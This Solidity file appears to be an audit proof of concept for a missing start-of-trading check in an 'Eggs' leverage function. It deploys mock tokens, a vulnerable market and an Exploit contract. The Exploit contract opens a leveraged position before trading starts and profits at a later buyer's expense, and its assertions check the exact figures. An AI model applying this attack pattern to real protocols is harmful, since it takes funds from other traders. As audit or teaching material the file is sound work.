// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Eggs — leverage does not require start, while buy does (Cantina, February 2025).
    The pool is 1000 SONIC / 1000 EGG. Before setStart, buy reverts and leverage
    swaps 200 SONIC (100 collateral plus 100 borrowed) for 166.666666666666666667 EGG.
    After start, a 200 SONIC buy receives 119.047619047619047619 EGG instead of the
    166.666666666666666667 it would have received alone. The attacker sells and
    repays. Net of the 100 SONIC collateral, the profit is 64.864864864864864866 SONIC.
    The fixed leverage has the same require(start) as buy and reverts before setStart. */

contract Sonic {
    string public symbol = "SONIC";
    uint8 public constant decimals = 18;
    address public minter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Egg {
    string public symbol = "EGG";
    uint8 public constant decimals = 18;
    address public minter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Eggs {
    Sonic public sonic;
    Egg public egg;
    address public lender;
    bool public start;
    uint256 public reserveSonic;
    uint256 public reserveEgg;
    uint256 public borrowReserve;
    mapping(address => uint256) public borrowed;

    constructor(Sonic _sonic, Egg _egg, address _lender) {
        sonic = _sonic;
        egg = _egg;
        lender = _lender;
    }

    function setStart() external {
        start = true;
    }

    function seed(uint256 s, uint256 eAmt) external {
        sonic.transferFrom(msg.sender, address(this), s);
        egg.transferFrom(msg.sender, address(this), eAmt);
        reserveSonic = s;
        reserveEgg = eAmt;
    }

    function fundLoans(uint256 amount) external {
        sonic.transferFrom(msg.sender, address(this), amount);
        borrowReserve += amount;
    }

    function buy(uint256 sonicIn) external returns (uint256 eggOut) {
        require(start, "Trading must be initialized");
        sonic.transferFrom(msg.sender, address(this), sonicIn);
        eggOut = _swapSonicIn(sonicIn);
        egg.transfer(msg.sender, eggOut);
    }

    function leverage(uint256 collateral) external returns (uint256 eggOut) {
        sonic.transferFrom(msg.sender, address(this), collateral); // @> VULN: no require(start), so this opens at the floor while buy reverts
        uint256 loan = collateral;
        borrowed[msg.sender] += loan;
        borrowReserve -= loan;
        eggOut = _swapSonicIn(collateral + loan);
        egg.transfer(msg.sender, eggOut);
    }

    function sell(uint256 eggIn) external returns (uint256 sonicOut) {
        require(start, "Trading must be initialized");
        egg.transferFrom(msg.sender, address(this), eggIn);
        uint256 k = reserveSonic * reserveEgg;
        uint256 newEgg = reserveEgg + eggIn;
        uint256 newSonic = k / newEgg;
        sonicOut = reserveSonic - newSonic;
        reserveEgg = newEgg;
        reserveSonic = newSonic;
        sonic.transfer(msg.sender, sonicOut);
    }

    function repay() external {
        uint256 debt = borrowed[msg.sender];
        sonic.transferFrom(msg.sender, address(this), debt);
        borrowed[msg.sender] = 0;
        sonic.transfer(lender, debt);
    }

    function _swapSonicIn(uint256 sonicIn) internal returns (uint256 eggOut) {
        uint256 k = reserveSonic * reserveEgg;
        uint256 newSonic = reserveSonic + sonicIn;
        uint256 newEgg = k / newSonic;
        eggOut = reserveEgg - newEgg;
        reserveSonic = newSonic;
        reserveEgg = newEgg;
    }
}

contract EggsFixed {
    Sonic public sonic;
    Egg public egg;
    bool public start;

    constructor(Sonic _sonic, Egg _egg) {
        sonic = _sonic;
        egg = _egg;
    }

    function setStart() external {
        start = true;
    }

    function leverage(uint256 collateral) external {
        require(start, "Trading must be initialized");
        collateral = collateral;
    }
}

contract Buyer {
    function buy(Eggs market, Sonic sonic, uint256 amount) external returns (uint256 eggOut) {
        sonic.approve(address(market), amount);
        eggOut = market.buy(amount);
    }
}

contract Lender {}

contract Exploit {
    Sonic public sonic; // nonce 1
    Egg public egg; // nonce 2
    Lender public lender; // nonce 3
    Eggs public market; // nonce 4
    Buyer public buyer; // nonce 5
    bool public buyReverted;
    uint256 public attackerEggs;
    uint256 public victimEggs;
    uint256 public sonicOut;
    uint256 public profit;

    constructor() {
        sonic = new Sonic();
        egg = new Egg();
        lender = new Lender();
        market = new Eggs(sonic, egg, address(lender));
        buyer = new Buyer();
    }

    function run() external {
        sonic.mint(address(this), 1000 ether + 100 ether + 100 ether);
        egg.mint(address(this), 1000 ether);
        sonic.approve(address(market), type(uint256).max);
        egg.approve(address(market), type(uint256).max);
        market.seed(1000 ether, 1000 ether);
        market.fundLoans(100 ether);
        try market.buy(1 ether) returns (uint256) {
            buyReverted = false;
        } catch {
            buyReverted = true;
        }
        require(buyReverted, "buy blocked");
        require(!market.start(), "not started");
        attackerEggs = market.leverage(100 ether);
        require(attackerEggs == 166666666666666666667, "floor eggs");
        require(market.borrowed(address(this)) == 100 ether, "debt 100");
        market.setStart();
        sonic.mint(address(buyer), 200 ether);
        victimEggs = buyer.buy(market, sonic, 200 ether);
        require(victimEggs == 119047619047619047619, "victim eggs");
        sonicOut = market.sell(attackerEggs);
        require(sonicOut == 264864864864864864866, "sale");
        market.repay();
        require(market.borrowed(address(this)) == 0, "repaid");
        profit = sonic.balanceOf(address(this)) - 100 ether;
        require(profit == 64864864864864864866, "profit");
        require(sonic.balanceOf(address(lender)) == 100 ether, "lender repaid");
    }
}
